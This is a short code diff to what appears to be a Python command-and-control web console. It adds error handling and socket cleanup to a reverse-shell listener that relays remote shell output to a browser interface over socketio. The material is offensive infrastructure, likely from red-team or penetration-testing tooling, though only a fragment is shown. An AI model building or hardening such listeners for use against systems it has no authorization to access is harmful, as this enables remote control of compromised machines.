@@ -3997,11 +3997,26 @@ def start_reverse_shell():
     reverse_shell_socket, addr = server_socket.accept()
     if config.enable_c2_debug == True:
         logger.info(f"Connection from {addr}")
-    while True:
-        data = reverse_shell_socket.recv(1024)
-        if not data:
-            break
-        socketio.emit('response', {'output': data.decode()}, namespace='/listener')
+    try:
+        while True:
+            try:
+                data = reverse_shell_socket.recv(1024)
+                if not data:
+                    break
+                socketio.emit('response', {'output': data.decode(errors='replace')}, namespace='/listener')
+            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
+                logger.info(f"Reverse shell connection lost ({addr}): {e}")
+                break
+            except OSError as e:
+                logger.warning(f"Reverse shell socket error ({addr}): {e}")
+                break
+    finally:
+        try:
+            reverse_shell_socket.close()
+        except Exception:
+            pass
+        if config.enable_c2_debug == True:
+            logger.info(f"Reverse shell session closed ({addr})")
 
 @app.route('/start_bridge', methods=['POST'])
 @requires_auth
